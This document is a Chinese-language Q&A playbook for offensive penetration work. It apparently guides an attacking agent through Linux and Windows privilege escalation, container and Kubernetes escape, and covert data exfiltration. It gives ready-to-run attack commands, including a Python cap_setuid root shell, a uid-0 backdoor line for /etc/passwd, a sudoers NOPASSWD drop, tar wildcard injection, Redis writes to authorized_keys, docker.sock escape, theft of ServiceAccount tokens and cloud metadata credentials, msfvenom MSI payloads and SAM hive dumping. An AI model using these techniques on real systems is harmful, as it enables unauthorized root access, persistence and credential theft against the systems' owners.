**Q5**: 命令参数校验+env_reset+secure_path 三重严格,被墙转向?
**A5**: 转"命令本身漏洞"——若是自定义 setuid/sudo 允许的 binary,当二进制文件分析(strings、objdump)找栈溢出/命令拼接/条件竞争等。或彻底放弃 sudo 转 SUID/cap/kernel。
**Q6**: 目标机器不许联外网下 payload 怎么办?
**A6**: base64 一段 payload 直接内联到 sudo 参数里,或用 `bash -c "$(echo B64|base64 -d)"`。反正 sudo 允许运行的 shell 内什么都能做,不必下载。

### SUID 二进制排查与优先级
**Q1**: 拿到 www-data,想找本机 SUID root 二进制,怎么排查?
**A1**: `find / -perm -4000 -type f 2>/dev/null` 一把梭,再过滤系统标准 SUID(passwd/su/sudo/mount 等常规的)。剩下的非标准的就是重点。判据:名字不熟悉、路径在 /opt/、/usr/local/ 的最可疑。
**Q2**: 找到的 SUID 是标准工具(如 find、cp、tar、python)怎么办?
**A2**: GTFObins 的 SUID 类目直接命中。find -exec、cp 覆盖敏感文件、tar --checkpoint、python 提权,都是一句话的事。
**Q3**: 找到一个自定义 SUID 二进制,怎么分析?
**A3**: 三步:(1) `strings` 找有没有硬编码路径、system()、popen();(2) `ltrace` 看动态调用了什么库函数,是否有 getenv/execvp;(3) 直接 `checksec`+objdump 反汇编找栈溢出/格式化字符串。命令拼接和 PATH 劫持是最常见 win。
**Q4**: 自定义 SUID 用了绝对路径且严格转义,老套路都不灵?
**A4**: 转"LD_PRELOAD 相关"——setuid 二进制默认拒绝 LD_PRELOAD,但若二进制没设置 RUNPATH 且加载了非系统目录的 so,可通过写恶意同名 so 到搜索路径提权;或用 CVE 层面的 glibc 漏洞。
**Q5**: SUID 全是标准的且系统打了补丁,被墙转向?
**A5**: 转 capabilities 维度——`getcap -r / 2>/dev/null` 找带 cap_setuid/cap_dac_read_search/cap_sys_admin 的二进制,同样能提权,思路和 SUID 类似但常被管理员忽略。
**Q6**: 找到 SUID 但用户不是 root(比如是别的用户)?
**A6**: 依然有用——横向到那个用户,再看那个用户 sudo -l/history/密钥。渗透很少一步到 root,分层横向是常态。

### Linux capabilities 提权判定
**Q1**: `getcap -r / 2>/dev/null` 看到几个非常规二进制带 cap,怎么判优先级?
**A1**: 按能力危险度排序:`cap_setuid`(直接切 uid=0)> `cap_dac_read_search`(读任意文件)> `cap_dac_override`(读写任意文件)> `cap_sys_admin`(几乎啥都能)> `cap_sys_ptrace`(注入其他进程)> `cap_net_admin`/`cap_net_raw`(网络级)。前三个直接一步到 root 或等价效果。
**Q2**: 一个 python/perl/ruby 带 cap_setuid+ep 怎么用?
**A2**: 一行:`python -c 'import os; os.setuid(0); os.system("/bin/sh")'`。cap_setuid+ep 意思是"可用且默认继承",直接 setuid(0) 就切成 root。
**Q3**: 带 cap 的二进制不是脚本解释器,而是某个业务程序,怎么办?
**A3**: 类似 SUID 分析——找命令拼接、PATH 依赖、库依赖劫持。cap 二进制虽不完全等同 setuid,但对 LD_PRELOAD 的过滤规则可能不同(取决于内核和 secure-execution 判定),值得一试。
**Q4**: 只有 cap_dac_read_search,不能起 shell,怎么用?
**A4**: 读 `/etc/shadow` 离线破 root hash,或读 root 用户的 `~/.ssh/id_rsa`。cap_dac_read_search 等价于绕过 DAC 读权限,拿凭据横向。
**Q5**: 系统上 getcap 输出为空(没装 libcap-bin 或真没有),被墙转向?
**A5**: 手动读 `/proc/*/status` 看是否有进程带 cap(CapEff/CapPrm 字段非全零),从跑起来的进程反推。或转 SUID/cron/kernel exp 正交路线。
**Q6**: 有 cap 但内核较新,cap 使用被 seccomp/apparmor 拦?
**A6**: 承认单跳提权不成,转"用 cap 拿低价值副产品"——比如 cap_net_admin 可以起 tun 隧道做流量代理,即便不到 root 也扩展了立足点能力。

### cron/systemd timer 提权切入点
**Q1**: 通过 `crontab -l`、`cat /etc/crontab`、`ls /etc/cron.*/`、`systemctl list-timers` 看到有 root 定时任务,怎么找注入点?
**A1**: 目标是找"root 任务里调用了当前用户可写的东西"。检查:(1) 任务脚本本身是否可写;(2) 脚本 source/include 的子文件是否可写;(3) 任务是否调用了相对路径命令且 PATH 前缀含可写目录;(4) 任务是否 tar/rsync/find 遍历了当前用户可写目录并对匹配文件执行操作。
**Q2**: 任务脚本本身权限 root:root 644,没直接注入点?
**A2**: 读它内部逻辑。常见坑:调用 `/tmp` 里的临时文件、依赖某个 pip 包路径可写、把 stdout 重定向到可写日志(结合 log rotation 的 create/su 项)。
**Q3**: 任务执行频率很低(每天/每周),怎么加速验证?
**A3**: 别硬等。用 strace/inotify-tools 监控相关文件访问观察任务是否已跑;或读日志(/var/log/syslog、systemd journal)找上次执行时间和输出。找到规律再决定注入方式。
**Q4**: 找到注入点但需要 root 目录写权限(比如 /root/backup/),怎么办?
**A4**: 转找 wildcard 提权——若 cron 里有 `tar czf backup.tar.gz *` 或 rsync 之类且 * 在可写目录里展开,写一个名字为 `--checkpoint-action=exec=/tmp/x.sh` 的空文件,tar 会把它当参数解析。经典 wildcard injection。
**Q5**: 系统上根本没找到 root 定时任务,被墙转向?
**A5**: 转"服务/进程"维度——`ps -ef` 找 root 守护进程,同样找可写脚本/配置/socket 的注入路径。或 `find / -writable -type d 2>/dev/null` 找所有当前用户可写目录反推是否有 root 服务会用到。
**Q6**: 找到注入点但触发后一直没生效?
**A6**: 检查 cron 环境:cron 的 PATH/HOME/USER 是精简环境,脚本里假设的环境变量可能没有,导致跑不起来。看 /var/spool/mail/root 或 syslog 里 cron 的错误输出定位。

### Linux 内核 exp 选型与炸靶风险
**Q1**: 前面所有路线都堵死,决定上内核 exp,怎么选?
**A1**: `uname -a` 拿 kernel 版本,`cat /etc/os-release` 拿发行版,`arch` 拿架构。匹配已知 exp:先看发行版是否有补丁 backport(RHEL/Ubuntu 常回补但内核版本号不变),再选稳定性最好的那个(如 Dirty COW、Dirty Pipe、pwnkit 家族、OverlayFS 家族)。判据:发行版+版本+架构三对齐才打。
**Q2**: 有多个候选 exp,先打哪个?
**A2**: 稳定性优先。用户态 exp(pwnkit、Dirty Pipe、sudo baron samedit)远比内核态 exp 安全,不炸靶。真到内核 exp,选公开 PoC 成熟、测试报告多的那个。
**Q3**: pwnkit(polkit)在几乎所有主流发行版都命中过,怎么快速判定可打?
**A3**: 检查 `/usr/bin/pkexec` 是否存在且是 SUID(`ls -l`)。版本没修补前几乎必中。已装 polkit >= 0.120 通常已修。判据:pkexec 存在 + 未打补丁 + 有编译器或能上传预编译 binary。
**Q4**: 没编译器怎么办?
**A4**: 攻击机预编译好目标架构+libc 版本的 binary,上传 /tmp 执行。若发行版是 musl(Alpine),用 musl 编译。
**Q5**: 内核 exp 打崩了目标怎么办?
**A5**: 承认最坏结果。若在授权渗透中,提前和客户约好"炸靶通知窗口";在 CTF 中,内核 exp 失败通常只是当前 shell 死,重连即可。判据:炸靶前先给自己留后路(备用 shell 或持久化)。
**Q6**: 全部内核 exp 都不适用(补丁齐、KASLR、SMEP/SMAP),被墙转向?
**A6**: 承认 root 拿不到,回到"当前权限最大化利用"——横向到别的账户、读能读的、往内网侧扩展。root 不是唯一目标。

### Docker 容器逃逸判定链
**Q1**: 拿到 shell 后怀疑在容器里,怎么判定?
**A1**: 四个信号:(1) `/.dockerenv` 或 `/run/.containerenv` 存在;(2) `cat /proc/1/cgroup` 出现 docker/kubepods/containerd;(3) `hostname` 是短 hex 或 pod-like;(4) 进程树 PID 1 不是 systemd/init 而是应用进程。命中任一即容器。
**Q2**: 判定是容器后,先摸什么?
**A2**: 摸"容器有多特权"。`capsh --print` 看 cap 列表;`ls -la /dev/` 看有没有 host disk 设备(/dev/sda 等)映射进来;`mount` 看有没有敏感目录挂进来(/、/var/run/docker.sock、/proc、/root);`cat /proc/self/status | grep Cap` 看 CapEff。判据:一项异常就有戏。
**Q3**: 有 docker.sock 挂进来怎么逃?
**A3**: `curl --unix-socket /var/run/docker.sock http://x/containers/create` 起一个 privileged + host root fs 挂载的容器,进去就是宿主 root。docker.sock 等于 docker daemon 完整权限。
**Q4**: privileged 容器(cap 全给了)怎么逃?
**A4**: 经典 cgroup notify_on_release trick:挂 cgroup、写 release_agent 指向宿主可执行脚本,触发 release 时以宿主 root 跑。或直接 mount 宿主 disk 后 chroot。判据:CapEff 是 ffffffffff 全权就一定能玩。
**Q5**: 非特权、无挂载、cap 精简的普通容器,逃不出怎么办(被墙转向)?
**A5**: 承认逃逸打不了,转"横向"——容器编排里同一 pod/namespace 内其他容器、Service IP、集群内部 API。或从容器网络反向 SSRF 攻主机上其他服务。逃逸不是唯一收益,横向常更值。
**Q6**: 有 host PID namespace 共享但无其他特权,能逃吗?
**A6**: 能。`nsenter -t 1 -m -u -i -n -p bash`(若有对应 cap)进 host namespaces。或攻击 host PID 1 进程读其内存/环境变量拿凭据。这是一种不完全但仍强大的越界。

### Kubernetes pod 内的横向决策
**Q1**: 判定在 K8s pod 内(env 里有 KUBERNETES_SERVICE_HOST),第一件事做什么?
**A1**: 找 ServiceAccount token:`cat /var/run/secrets/kubernetes.io/serviceaccount/token`。有 token 就等于有一份 API 访问凭据。同目录读 ca.crt 和 namespace。判据:能读到就把 kubectl(或直接 curl)对准 API server 试探权限。
**Q2**: 拿到 token 后怎么快速评估权限?
**A2**: `curl -k -H "Authorization: Bearer $TOKEN" https://KUBE/api/v1/namespaces/$NS/pods` 试列 pod。或若能用 kubectl,`kubectl auth can-i --list` 一目了然。判据:能 list pods/secrets/deployments 就有很多横向面。
**Q3**: 权限很弱(只能 get 自己 pod),怎么办?
**A3**: 看能否 access secrets(存 DB 凭据/云 IAM key/webhook token 很常见),或能 exec/portforward 到别的 pod。都无就退到"读环境变量+挂载卷"——ConfigMap/Secret 常直接挂进来即读即得。
**Q4**: 集群 API 网络不可达(NetworkPolicy 限制)怎么办?
**A4**: 转"云 metadata"维度——169.254.169.254 拿云 IAM 角色临时凭据(EKS/GKE/AKS 都有变种),配合云 SDK 横向到 S3/OSS/其他实例。K8s 内的 pod 常带较宽 IAM。
**Q5**: metadata 也被拦(IMDSv2 强制 token 或阻断跳数),被墙转向?
**A5**: 转"集群内部服务"——pod 网络里其他 service 常无认证(内部信任模型),扫 ClusterIP 段找无鉴权面板/未授权 API,横向不需要拿 admin。
**Q6**: 目标就是拿集群 admin,现有 token 权限太低,还有别的招?
**A6**: 看能否走 CVE 面(kubelet 只读 10255、read/write 10250 未授权;etcd 未授权;API server ~/kube-controller-manager 边缘 CVE)。或社工:看 pod 里有没有开发人员留的 kubeconfig。

### writable 敏感文件选哪个下手
**Q1**: 探测发现 `/etc/passwd` 可写(或 `/etc/shadow`、`sudoers`、`/etc/pam.d/*`),先动哪个?
**A1**: 优先级:passwd(最简单)> sudoers(次简单,一行加 NOPASSWD)> shadow(需知道自己账户加 hash)> pam(改配置绕过认证,复杂但强大)。判据:改动量最小的先做。
**Q2**: passwd 可写具体怎么用?
**A2**: 追加一行 `attacker:$1$known$hash:0:0:root:/root:/bin/bash`(密码 hash 自定义,uid=0)。或用 openssl passwd -1 生成。追加后 `su attacker` 输入密码就是 root。判据:追加不影响原有账户,几乎无副作用。
**Q3**: 只有 shadow 可写、passwd 只读怎么办?
**A3**: 改 root 那行的密码 hash 字段为已知 hash 的加盐结果,`su root` 用你的密码登。风险:改动 root 密码可能被监控告警。评估交付紧迫度决定。
**Q4**: sudoers 可写但语法一错就全废,怎么最保险改?
**A4**: 用 `sudoers.d/` 里加新文件而非改主文件:`echo 'attacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/x`。语法错也只废这个文件。判据:优先"添加"而非"修改"。
**Q5**: 全部路径都只读、pam 也只读,被墙转向?
**A5**: 转"服务配置"维度——常有 root 服务(nginx/apache/mysql)的配置文件属组可写,改配置注入执行(nginx 加 lua 块、apache 加 handler、mysql 改 my.cnf 里 general_log 到 web 目录写日志成 shell)。
**Q6**: 服务配置也全只读,再往哪找?
**A6**: 转"crontab 用户段"——若 /var/spool/cron/crontabs/ 某文件是别的用户组可写,改注入。或 /etc/cron.d/ 有 root 权限但目录 world-writable(少见但有,配置错误)。写入是 Linux 提权最直白的一条路,找可写目标本身就是主线。

### PATH 劫持配合 cron/SUID 场景
**Q1**: 找到 root 脚本(cron 或 SUID wrapper)里用了不带路径的命令(如 `ls`、`awk`),怎么劫持?
**A1**: 前提是脚本的 PATH 变量前缀包含当前用户可写目录。构造同名恶意命令到该目录,root 执行时优先命中我们的版本。判据:先读脚本确认命令是相对路径 + 判断脚本运行时的 PATH。
**Q2**: cron 默认 PATH 是 /usr/bin:/bin,当前用户没这些目录写权限怎么办?
**A2**: 看脚本自己有没有 `PATH=/tmp:$PATH` 或 source 了含 PATH 的配置。或看是否用 `sudo -E` 保留了调用者环境的 PATH(sudo 里更常见)。cron 自己的 PATH 严格,难劫持。
**Q3**: SUID 二进制里 execvp 了不带路径的命令,怎么打?
**A3**: SUID 环境下 glibc 会 sanitize 一些环境变量但不清 PATH——写恶意命令到某目录后 `PATH=该目录 /suid_binary` 直接跑,SUID 保留 PATH 会命中恶意命令。判据:strace 一次看它调什么命令。
**Q4**: 命令用绝对路径无 PATH 依赖,能不能劫持库?
**A4**: SUID 不吃 LD_PRELOAD 但吃 LD_AUDIT 有时不吃、吃 RPATH/RUNPATH 若有相对路径则可。或攻击命令依赖的配置文件(若能写配置)。
**Q5**: 上述全没戏,被墙转向?
**A5**: 转"脚本文件竞争"——如果 root cron 定期 `cp /home/*/report.log /var/root/`,时间窗口内可以创建同名符号链接指向别处,或 TOCTOU 篡改文件内容。竞争窗口小但可行。
**Q6**: 目标不许用外网工具下载 payload 怎么办?
**A6**: 恶意命令可以是 shell 脚本(不需编译),内容一行 `chmod u+s /bin/bash` 或 `cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash`,以 root 执行后保留 SUID bash,任何时候 `/tmp/rootbash -p` 就是 root。

### MySQL UDF 提权判定
**Q1**: 拿到本机 MySQL root 密码或 socket 直连权限,想 UDF 提权,判据是什么?
**A1**: 三条件:(1) MySQL 以 root 或高权用户运行(常见);(2) `secure_file_priv` 为空或指向 plugin_dir 可写目录;(3) 已知 plugin_dir 路径(`show variables like 'plugin_dir'`)且可写。判据:三者齐即上 UDF。
**Q2**: secure_file_priv 有值,plugin_dir 写不进,怎么办?
**A2**: 高版本 MySQL 默认 secure_file_priv 有值(/var/lib/mysql-files/),就写不了 plugin dir。转另一路:mysql general_log 打开写 log 到 web 目录,配合 select 语句写 PHP shell。
**Q3**: 版本能 UDF 但缺 udf.so 文件、无外网下载怎么办?
**A3**: udf 二进制小,base64 编码后通过 SQL insert 到 blob 表,再 select ... into dumpfile 到 plugin_dir。全离线。判据:hex/base64 上传路径是 SQL 层内建能力,几乎不受网络限制。
**Q4**: create function 报错找不到符号怎么办?
**A4**: UDF so 的符号导出跟 MySQL 版本必须匹配。用 sqlmap 内置或 mysqludf-sys 项目对应 MySQL major 版本的 so。如版本冷门自己 gcc 编译。
**Q5**: UDF 全套失败,secure_file_priv 死锁,被墙转向?
**A5**: 转"MySQL 拿数据"——UDF 是为提权,拿数据用 SELECT INTO 或直接 mysqldump 就够。若目标是数据不是 root,不必 UDF。
**Q6**: MySQL 服务不以 root 跑,UDF 只能拿到 mysql 用户,还值不值得?
**A6**: 值得。mysql 用户常能读所有 web 应用的 config、访问其他用户上传目录,继续横向。UDF 拿到即立足点升级,即使不 root。

### Redis 未授权本地写文件提权路径
**Q1**: 本机 Redis 未授权,想通过它提权到 root,能怎么做?
**A1**: 看 Redis 以什么用户跑:root 就写 `authorized_keys` 到 /root/.ssh/、写 crontab 到 /etc/cron.d/;非 root(常见 redis 用户)就写到 redis 用户可写目录,再横向。判据:redis 进程 uid 决定能写哪。
**Q2**: 具体怎么写 authorized_keys?
**A2**: `CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET x "\n\nssh-rsa AAAA...\n\n"; SAVE`。SAVE 触发 RDB 落盘,内容含公钥,SSH 会接受(前后加换行避免 RDB 头污染 key 行)。
**Q3**: 目标 /root/.ssh 不存在怎么办?
**A3**: 先看 root 是否允许 SSH 登录(/etc/ssh/sshd_config PermitRootLogin)。不允许就换目标——写 /home/xxx/.ssh/authorized_keys(需知道存在的普通用户名)。或写 cron.d 触发命令。
**Q4**: 主从复制 RCE 路线什么时候用?
**A4**: 4.x+ 的 slaveof 主从同步能加载 module 实现 RCE。当写文件路线失败(dir 不可写、SSH 不通),转主从模块加载:自己起一个假的 master 让目标从我方拉 module 加载。判据:目标 Redis 版本 4.x-6.x,module 加载未禁。
**Q5**: 未授权但 Redis 以低权且沙箱严,被墙转向?
**A5**: 转"读凭据"——Redis 常存 session、缓存、token,`KEYS *` 一把梭。就算不能提权,拿到应用 session 或 admin token 也是大收益。
**Q6**: 网络上目标 Redis 只监听 unix socket,能连吗?
**A6**: 能。拿到 shell 后 `redis-cli -s /path/to/redis.sock`,或用 nc -U。unix socket 本地权限决定谁能连,读写 socket 文件权限即可。

### Python jail / 受限 eval 逃逸
**Q1**: 拿到一个 Python 受限 eval 沙箱(过滤了 import、__import__、compile 等),怎么逃?
**A1**: 目标:拿到任意对象的 `__class__`.__mro__[-1] 即 object,遍历 __subclasses__() 找危险类。经典找 `subprocess.Popen`、`os._wrap_close`、`warnings.catch_warnings` 等。判据:找到一个能间接 exec 命令的子类就赢。
**Q2**: `.` 也被过滤怎么办?
**A2**: 用 `getattr` 替代或字符串拼接绕。`getattr(obj, "__class__")` 等价 obj.__class__,`chr(x)+chr(y)` 拼字符串再 getattr。判据:过滤字符不查函数调用参数就绕得过。
**Q3**: 关键字全过滤(class、mro、subclasses 字符串都不能出现)怎么办?
**A3**: 用 f-string、`{}.format` 或 `+` 拼字符串;或用 dict 索引 `__builtins__["ex"+"ec"]`。这些都是编译时不含关键字的运行时构造。
**Q4**: __builtins__ 被清空怎么办?
**A4**: 从 frame 对象走。`(lambda: 0).__globals__` 或 `(lambda: 0).__code__` 反向拿 frame,再从 frame 拿到 builtins。或利用 generator/coroutine 的 `gi_frame`/`cr_frame`。
**Q5**: 沙箱是 RestrictedPython 或 pyodide 类真正字节码级限制,逃不出去(被墙转向)?
**A5**: 转"沙箱环境侧"——沙箱本身跑在某个进程里,若能利用沙箱允许的功能(如网络请求、文件读)触发外部漏洞或做侦察,不必非要在 Python 内 RCE。
**Q6**: 目标 Python 版本较新(3.11+)且 audit hooks 拦了 exec/system,怎么办?
**A6**: audit hook 会记录并可拒绝敏感操作。绕 audit 需从 C 扩展绕(ctypes 直接 syscall),但受限沙箱通常不给 ctypes。承认硬绕不了,转沙箱外侧攻击面。

### 拿到 shell 但没 tty - tty 升级决策
**Q1**: 反弹到 nc 上的 shell 没 tty,`sudo` 报 sorry, must have tty,怎么升级?
**A1**: 首选 `python -c 'import pty;pty.spawn("/bin/bash")'`(python3 同理)。次选 `script -q /dev/null bash`。再次 `expect` 或 `socat`。判据:一有 tty,sudo/su/vim 全能用。
**Q2**: python 不在,shell 也没 script,怎么办?
**A2**: `perl -e 'exec "/bin/sh"'` 起子 shell 有时可用;`SHELL=/bin/bash script -qc /bin/bash /dev/null`;`ssh -o ProxyCommand=... localhost` 借 ssh 自身起 pty。找到一个能起 pty 的工具就行。
**Q3**: pty 起来了但 Ctrl+C 直接杀 nc 怎么办?
**A3**: 本地 nc 端 `stty raw -echo; fg` 把本地 tty 交给远端,再 `export TERM=xterm; stty rows R cols C`(R/C 匹配你本地终端大小)。这一步是让远端 tty 完全接管键盘,vim/less/tmux 都能用。
**Q4**: 目标机上 python/perl/script/socat 都没有(极简容器),被墙转向?
**A4**: 转"换个 shell 载体"——弃 nc,用 ssh(若能种 authorized_keys)或 http 隧道(reGeorg/chisel)拿到有 pty 的 session。或用 msfvenom 的 meterpreter 自带 pty 处理。
**Q5**: SSH 也不通、只能 nc,又必须交互,怎么办?
**A5**: 上传静态编译的 `pty.py`(用 pyinstaller 打包)或静态 socat。互联网上很多免依赖 pty 起子的静态 binary,提前备好。
**Q6**: tty 起来后 backspace 变 ^H、tab 无补全怎么办?
**A6**: `export TERM=xterm-256color`,`stty sane`,或 `reset`。多数时候 TERM 变量正确 + rows/cols 对了就能修好。

### Windows 服务弱权限提权
**Q1**: 拿到 Windows 低权 shell,想通过服务提权,先看什么?
**A1**: `sc query type= service state= all`(或 `Get-Service`)列服务,再对每个用 `sc qc 服务名` 看 BINARY_PATH 和 SERVICE_START_NAME(是否 LocalSystem)。判据:LocalSystem 服务是提权目标,其他没那么值钱。
**Q2**: 哪种服务错配可利用?
**A2**: 三类:(1) 服务二进制路径未加引号且含空格(经典 unquoted service path);(2) 服务二进制或所在目录当前用户可写(直接换 binary);(3) 服务本身允许 SERVICE_CHANGE_CONFIG(sc config 改路径重启)。工具:accesschk.exe 或 icacls 逐个查。
**Q3**: 找到 unquoted 路径怎么利用?
**A3**: 路径如 `C:\Program Files\App Foo\bin.exe`,若 `C:\Program.exe` 或 `C:\Program Files\App.exe` 可写,服务启动时 Windows 会先尝试短路径,恶意二进制被以 SYSTEM 跑。判据:检查每一级中间路径的可写权限。
**Q4**: 服务权限严、路径也正确,还能怎么打?
**A4**: 转"服务依赖"或"DLL 劫持"——服务加载的 DLL 若在 PATH 搜索时命中可写目录,就用 DLL 劫持。或看服务是否 auto-restart(RECOVERY 选项),配合触发 crash 迫使重启加载新 binary。
**Q5**: 全部服务配置无误,被墙转向?
**A5**: 转 Windows 特权维度——`whoami /priv` 看是否有 SeImpersonate、SeAssignPrimaryToken、SeBackup、SeRestore,任一都能玩(见下一条链)。
**Q6**: 服务改动后系统重启才生效,不能等怎么办?
**A6**: 有 SERVICE_STOP+SERVICE_START 权限时立即 `sc stop && sc start`。没有的话看服务是否 crash-restart,故意让当前服务 crash(如果能触发)。或改 auto-run 项等下次登录。

### Windows SeImpersonate / potato 家族选型
**Q1**: `whoami /priv` 看到 SeImpersonatePrivilege 启用,怎么用它提权?
**A1**: 用 potato 家族——RottenPotato/JuicyPotato/PrintSpoofer/RoguePotato/GodPotato 等,思路一致:诱导 SYSTEM 服务向我们的假 RPC/管道认证,拿到 SYSTEM token 后 CreateProcessWithToken。判据:SeImpersonate 是核心前置,IIS/MSSQL/服务账户身份常有。
**Q2**: 不同 Windows 版本选哪个 Potato?
**A2**: Server 2016 前 JuicyPotato 通杀;Server 2019/Win10 1809+ 需 PrintSpoofer(利用 print spooler)或 RoguePotato(需 DCOM 出网到另一台);Server 2022/Win11 用 GodPotato(利用 RPC over NP)。判据:先看版本再选,不要盲试。
**Q3**: PrintSpoofer 要求 spooler 服务开着,若被关闭怎么办?
**A3**: 换 RoguePotato(需要能出网到 445/135 到攻击者控制的机器)或 GodPotato。判据:一个不成换下一个,potato 家族互补。
**Q4**: 拿到 token 后 CreateProcessAsUser 报错怎么办?
**A4**: 分两种:(1) token 类型不是 primary,要 DuplicateTokenEx 转 primary;(2) 目标 session 号不对,新进程要指定 session 0 或跟随。工具内置处理,若手工做 API 调用要注意 lpDesktop/lpCurrentDirectory。
**Q5**: SeImpersonate 没有但有 SeBackupPrivilege 怎么办?
**A5**: 转"注册表 hive dump"——SeBackup 允许读取任何文件包括 SAM/SYSTEM/SECURITY hive。`reg save HKLM\SAM sam.hive` 后离线 secretsdump 拿本地 hash,再 pass-the-hash。
**Q6**: 全部 potato 失败、Windows 已是最新补丁、无 hot exp,被墙转向?
**A6**: 转 Windows 云内网——查是否加域(`systeminfo | findstr Domain`),加域就切到 AD 侧攻击面(Kerberoast、ADCS、ntlm relay),单机提权不了转横向到域控。

### AlwaysInstallElevated 检查
**Q1**: 低权 Windows 低成本提权,第一个必查项是什么?
**A1**: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` 和 HKLM 同路径,两者都是 1 就中——任意用户能以 SYSTEM 装 MSI。判据:两个键都必须为 1,只一个不生效。
**Q2**: 命中后怎么用?
**A2**: `msfvenom -f msi -p windows/x64/exec ...` 生成 MSI,`msiexec /quiet /qn /i evil.msi` 就以 SYSTEM 执行。整个过程无需 EXP。
**Q3**: 只有 HKCU 是 1、HKLM 不是,怎么办?
**A3**: 该策略只有两个键同时开才生效。转其他快速项:未加引号服务路径、可写服务二进制、Scheduled Tasks 里 SYSTEM 任务可否修改。
**Q4**: 两个键都为 1 但 msiexec 报错权限不足?
**A4**: 检查 UAC 状态和当前用户是否 non-admin(该 trick 就是给 non-admin 用的,admin 反而受 UAC 影响)。或用 `/qb` 换 `/qn`,或改 payload。
**Q5**: 键都不为 1、政策关闭,被墙转向?
**A5**: 转其他 Windows 常见错配枚举(winPEAS 类思路,agent 应内建清单):UAC bypass、UAC virtual store、可写 startup 目录、Startup Registry Run 键、Scheduled Task 弱权限、Credential Manager 存的凭据。
**Q6**: 已经能装 MSI 提权了,但不想留 MSI 落地怎么办?
**A6**: msiexec 支持从 http/smb URL 装,payload 不落盘;或用小 MSI 只加账户到 Administrators 组,装完删。判据:落地的东西越少 IoC 越少。

### 出站被限,执行成功但看不到回显 - 回显信道选择
**Q1**: 打通了 RCE 但无回显、目标不允许出站到互联网,怎么拿回显?
**A1**: 按优先级换信道:(1) HTTP 响应内联回显(将命令输出塞到当前请求响应);(2) 写文件到 web 可访问目录再 GET;(3) DNS 外带(dnslog);(4) 侧信道(时间盲、错误盲);(5) 内网回连到中间跳板。判据:目标网络策略决定哪条通。
**Q2**: 若是 disable_functions 场景,命令通过 LD_PRELOAD 起 fork 子进程执行,主 PHP 不等待怎么内联回显?
**A2**: LD_PRELOAD 的 so 里可以把命令输出写文件 `/tmp/x.out`,再让 PHP 层 `file_get_contents('/tmp/x.out')` 读回来放响应体。判据:文件桥接是最稳定的信道,几乎不受限制。
**Q3**: 目标 open_basedir 挡了 /tmp 怎么办?
**A3**: 写到 web 目录内 PHP 有权写的位置,或写到 /dev/shm(不常拦)。或让 so 直接把输出通过管道传回 PHP fd 1(要求命令和 PHP fd 关联)。
**Q4**: 完全无写权限、无出站,能不能用响应头/HTTP status code 编码?
**A4**: 能。每次请求执行一小段命令,输出编码成 status code 数字或 header 长度,通过多次请求还原。传输慢但可行,适合小数据(标志/密码)。
**Q5**: 目标做了严格 egress filter,DNS 也不走外网,被墙转向?
**A5**: 转"内网跳板"——先找目标能访问的内网主机(内网 web、内部 DNS),把它当中转:先反弹到那台再从那台向外。或用 ICMP 隧道(若 ICMP 出)、TCP over DNS 内网 DNS 服务器(有些内网 DNS 允许递归)。
**Q6**: 一切外带均不通,如何交付结果?
**A6**: 转"最小信息回带"——只拿关键 1KB 数据(密码、密钥),用 HTTP 缓存标记、cookie、URL 段编码回带。渗透最终交付常常只需几十字节的关键 secret。
